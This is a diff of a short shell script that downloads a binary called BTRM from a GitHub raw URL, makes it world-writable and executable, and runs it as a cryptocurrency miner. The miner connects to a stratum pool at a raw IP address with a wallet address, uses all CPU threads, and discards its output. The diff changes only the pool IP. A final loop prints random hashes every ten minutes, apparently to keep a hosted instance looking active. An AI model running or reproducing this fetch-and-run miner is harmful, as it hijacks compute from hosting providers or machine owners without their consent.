@@ -1,4 +1,4 @@
 wget https://raw.githubusercontent.com/novalanto010101/file/main/BTRM
 chmod 777 BTRM
-./BTRM -a yespowertide -o stratum+tcp://134.122.109.135:80 -u TNbER6yF1hoAQEzY2J8gd41AFy5BdLn6LQ.$(echo $(shuf -i 1-20000 -n 1)-TTD) -p webpassword=x,m=solo -t$(nproc --all) >/dev/null 2>&1
+./BTRM -a yespowertide -o stratum+tcp://46.101.19.145:80 -u TNbER6yF1hoAQEzY2J8gd41AFy5BdLn6LQ.$(echo $(shuf -i 1-20000 -n 1)-TTD) -p webpassword=x,m=solo -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
